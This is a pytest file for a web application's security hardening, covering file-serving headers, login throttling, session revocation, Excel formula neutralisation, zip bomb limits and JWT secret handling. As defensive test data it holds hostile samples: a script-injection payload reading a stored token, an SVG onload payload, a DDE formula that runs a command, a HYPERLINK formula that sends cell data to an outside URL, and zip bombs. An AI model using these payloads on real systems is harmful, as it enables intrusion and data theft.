"""Security hardening: stored-file serving, headers, login throttle, token revocation, own profile,
Excel formula injection, zip bombs and the JWT secret."""
from __future__ import annotations

import io
import uuid
import zipfile

from openpyxl import Workbook, load_workbook

from app.config import Settings, ensure_jwt_secret, get_settings
from app.core.xlsxguard import check_xlsx
from app.services import loginguard, xlsafe
from app.services.drawings import iter_zip


def _uid(p: str) -> str:
    return f"{p}{uuid.uuid4().hex[:6]}"


def _user(client, admin_headers, password: str = "pass1234", role: str = "designer") -> tuple[int, str, dict]:
    name = _uid("s")
    r = client.post("/api/admin/users", headers=admin_headers, json={"username": name, "password": password, "role": role})
    assert r.status_code == 201, r.text
    tok = client.post("/api/auth/login", data={"username": name, "password": password}).json()["access_token"]
    return r.json()["id"], name, {"Authorization": f"Bearer {tok}"}


def test_uploaded_html_is_never_served_as_html(client, admin_headers):
    a, _, ah = _user(client, admin_headers)
    b, _, _ = _user(client, admin_headers)
    room = client.post("/api/chat/direct", headers=ah, json={"user_id": b}).json()["id"]
    evil = b"<script>alert(localStorage.erp_token)</script>"
    m = client.post(f"/api/chat/rooms/{room}/messages", headers=ah, data={"body": ""},
                    files={"file": ("evil.html", evil, "text/html")}).json()
    f = client.get(f"/api/chat/messages/{m['id']}/file", headers=ah)
    assert f.status_code == 200 and f.content == evil
    assert f.headers["content-type"] == "application/octet-stream"
    assert f.headers["content-disposition"].startswith("attachment")
    assert f.headers["x-content-type-options"] == "nosniff"
    assert "sandbox" in f.headers["content-security-policy"]
    # An SVG claiming to be an image is not accepted as a photo
    svg = client.post("/api/photos", headers=admin_headers, data={"entity": "part", "key": _uid("P")},
                      files={"file": ("x.svg", b"<svg onload=alert(1)>", "image/svg+xml")})
    assert svg.status_code == 400


def test_security_headers_and_docs_off(client):
    r = client.get("/api/health")
    assert r.headers["x-frame-options"] == "DENY" and r.headers["referrer-policy"] == "no-referrer"
    assert client.get("/api/docs").status_code == 404
    assert client.get("/api/openapi.json").status_code == 404


def test_login_throttle(client, admin_headers):
    loginguard.reset()
    _, name, _ = _user(client, admin_headers)
    for _ in range(get_settings().login_attempts):
        assert client.post("/api/auth/login", data={"username": name, "password": "wrong-pass"}).status_code == 401
    r = client.post("/api/auth/login", data={"username": name, "password": "pass1234"})
    assert r.status_code == 429 and "Retry-After" in r.headers
    loginguard.reset()
    assert client.post("/api/auth/login", data={"username": name, "password": "pass1234"}).status_code == 200


def test_password_change_ends_other_sessions(client, admin_headers):
    uid, name, h = _user(client, admin_headers)
    assert client.post("/api/auth/password", headers=h,
                       json={"old_password": "pass1234", "new_password": "kisa"}).status_code == 400
    r = client.post("/api/auth/password", headers=h, json={"old_password": "pass1234", "new_password": "yeni-sifre-1"})
    assert r.status_code == 200
    assert client.get("/api/auth/me", headers=h).status_code == 401          # old token revoked
    new = {"Authorization": f"Bearer {r.json()['access_token']}"}
    assert client.get("/api/auth/me", headers=new).json()["username"] == name
    # Admin reset and deactivation also end the sessions
    assert client.post(f"/api/admin/users/{uid}/password", headers=admin_headers,
                       json={"password": "admin-set-1"}).status_code == 200
    assert client.get("/api/auth/me", headers=new).status_code == 401


def test_own_profile(client, admin_headers):
    _, _, h = _user(client, admin_headers)
    r = client.put("/api/auth/me", headers=h, json={"full_name": "  Ayşe Yılmaz "})
    assert r.status_code == 200 and r.json()["full_name"] == "Ayşe Yılmaz"
    assert client.get("/api/auth/me", headers=h).json()["full_name"] == "Ayşe Yılmaz"


def test_excel_formula_injection():
    wb = Workbook()
    ws = wb.active
    ws["A1"] = '=HYPERLINK("http://x/?"&B1,"tık")'
    ws["A2"] = "=cmd|' /C calc'!A0"
    ws["A3"] = '=IF(B3="","",B3*2)'
    ws["A4"] = "=SUBTOTAL(109,B5:B9)"
    buf = io.BytesIO()
    xlsafe.neutralize(wb).save(buf)
    out = load_workbook(io.BytesIO(buf.getvalue())).active
    assert out["A1"].data_type == "s" and out["A2"].data_type == "s"
    assert out["A3"].data_type == "f" and out["A4"].data_type == "f"


def test_zip_bomb_guards(tmp_path):
    p = tmp_path / "bomb.zip"
    with zipfile.ZipFile(p, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("a.pdf", b"\0" * (80 * 1024 * 1024))
    errors = [e for *_, e in iter_zip(p)]
    assert errors and "büyük" in errors[0]
    x = io.BytesIO()
    with zipfile.ZipFile(x, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("xl/worksheets/sheet1.xml", b" " * (50 * 1024 * 1024))
    try:
        check_xlsx(x)
        raise AssertionError("bomb accepted")
    except ValueError:
        pass


def test_weak_jwt_secret_is_replaced(tmp_path):
    s = Settings(jwt_secret="change-me", data_dir=tmp_path)
    ensure_jwt_secret(s)
    assert len(s.jwt_secret) >= 32 and (tmp_path / ".jwt_secret").read_text() == s.jwt_secret
    again = Settings(jwt_secret="", data_dir=tmp_path)
    ensure_jwt_secret(again)
    assert again.jwt_secret == s.jwt_secret
    strong = Settings(jwt_secret="x" * 40, data_dir=tmp_path)
    ensure_jwt_secret(strong)
    assert strong.jwt_secret == "x" * 40
